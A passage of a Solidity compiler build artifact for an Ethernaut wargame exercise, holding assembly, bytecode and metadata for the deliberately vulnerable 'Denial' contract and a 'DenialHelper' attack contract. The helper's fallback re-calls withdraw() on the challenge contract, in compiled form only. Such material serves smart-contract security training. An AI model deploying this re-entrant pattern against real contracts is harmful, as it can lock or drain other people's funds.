										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "1F"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "1"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "100"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "EXP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "NOT",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3856,
											"end": 3865,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3872,
											"end": 3873,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3868,
											"end": 3869,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "INVALID",
											"source": 2
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3868,
											"end": 3873,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 3856,
											"end": 3873,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3856,
											"end": 3873,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3977,
											"end": 3978,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3970,
											"end": 3978,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3970,
											"end": 3978,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3970,
											"end": 3978,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"contractBalance()": "8b7afe2e",
							"owner()": "8da5cb5b",
							"partner()": "be10862b",
							"setWithdrawPartner(address)": "4e1c5914",
							"withdraw()": "3ccfd60b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"contractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"partner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_partner\",\"type\":\"address\"}],\"name\":\"setWithdrawPartner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/Denial.sol\":\"Denial\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/Denial.sol\":{\"keccak256\":\"0x19248043f462d196626c1c83640f53d6f26212a8d2fc462abdfdaeb913cb964a\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://7d7be0f64c955a8625fd705e663e1c894b3fd2f69c224dc5f122a8576e739319\",\"dweb:/ipfs/Qmewr5UD5XgqZqCjUDaa9HYz43YT6RQzYDiDakjTCwH513\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x9a9cf02622cd7a64261b10534fc3260449da25c98c9e96d1b4ae8110a20e5806\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://2df142592d1dc267d9549049ee3317fa190d2f87eaa565f86ab05ec83f7ab8f5\",\"dweb:/ipfs/QmSkJtcfWo7c42KnL5hho6GFxK6HRNV91XABx1P7xDtfLV\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 7,
								"contract": "contracts/Ethernaut/Denial.sol:Denial",
								"label": "partner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 15,
								"contract": "contracts/Ethernaut/Denial.sol:Denial",
								"label": "timeLastWithdrawn",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 19,
								"contract": "contracts/Ethernaut/Denial.sol:Denial",
								"label": "withdrawPartnerBalances",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/Ethernaut/DenialHelper.sol": {
				"DenialHelper": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address payable",
									"name": "denialAddr",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/DenialHelper.sol\":84:315  contract DenialHelper {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ethernaut/DenialHelper.sol\":139:236  constructor(address payable denialAddr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contracts/Ethernaut/DenialHelper.sol\":217:227  denialAddr */\n  dup1\n    /* \"contracts/Ethernaut/DenialHelper.sol\":197:207  denialInst */\n  0x00\n  dup1\n    /* \"contracts/Ethernaut/DenialHelper.sol\":197:228  denialInst = Denial(denialAddr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/DenialHelper.sol\":139:236  constructor(address payable denialAddr) public {\r... */\n  pop\n    /* \"contracts/Ethernaut/DenialHelper.sol\":84:315  contract DenialHelper {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/DenialHelper.sol\":84:315  contract DenialHelper {\r... */\n      mstore(0x40, 0x80)\n        /* \"contracts/Ethernaut/DenialHelper.sol\":283:293  denialInst */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/DenialHelper.sol\":283:302  denialInst.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/Ethernaut/DenialHelper.sol\":283:304  denialInst.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_5\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_5:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_7\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_7:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Ethernaut/DenialHelper.sol\":84:315  contract DenialHelper {\r... */\n      stop\n\n    auxdata: 0xa26469706673582212207774742202bd2a27e581c2b93394d524d5acc6ade41dd36471dd46434f82f40664736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405161014d38038061014d8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505060ba806100936000396000f3fe608060405260008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015606b57600080fd5b505af1158015607e573d6000803e3d6000fd5b5050505000fea26469706673582212207774742202bd2a27e581c2b93394d524d5acc6ade41dd36471dd46434f82f40664736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x14D CODESIZE SUB DUP1 PUSH2 0x14D DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH1 0xBA DUP1 PUSH2 0x93 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x6B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0x7E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP STOP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH24 0x74742202BD2A27E581C2B93394D524D5ACC6ADE41DD36471 0xDD CHAINID NUMBER 0x4F DUP3 DELEGATECALL MOD PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "84:231:1:-:0;;;139:97;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;217:10;197;;:31;;;;;;;;;;;;;;;;;;139:97;84:231;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015606b57600080fd5b505af1158015607e573d6000803e3d6000fd5b5050505000fea26469706673582212207774742202bd2a27e581c2b93394d524d5acc6ade41dd36471dd46434f82f40664736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x6B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0x7E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP STOP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH24 0x74742202BD2A27E581C2B93394D524D5ACC6ADE41DD36471 0xDD CHAINID NUMBER 0x4F DUP3 DELEGATECALL MOD PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "84:231:1:-:0;;;283:10;;;;;;;;;;:19;;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;84:231"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "37200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 84,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 84,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 84,
									"end": 315,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "LT",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 139,
									"end": 236,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 217,
									"end": 227,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 197,
									"end": 207,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 197,
									"end": 207,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 197,
									"end": 228,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 197,
									"end": 228,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 197,
									"end": 228,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 197,
									"end": 228,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 139,
									"end": 236,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 84,
									"end": 315,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 84,
									"end": 315,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 84,
									"end": 315,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 84,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 84,
									"end": 315,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 84,
									"end": 315,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 84,
									"end": 315,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212207774742202bd2a27e581c2b93394d524d5acc6ade41dd36471dd46434f82f40664736f6c634300060c0033",
									".code": [
										{
											"begin": 84,
											"end": 315,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 84,
											"end": 315,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 84,
											"end": 315,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 293,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 283,
											"end": 293,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 283,
											"end": 293,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 283,
											"end": 293,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 283,
											"end": 302,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 283,
											"end": 302,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 283,
											"end": 302,
											"name": "PUSH",
											"source": 1,
											"value": "3CCFD60B"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 283,
											"end": 304,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 283,
											"end": 304,
											"name": "MSTORE",
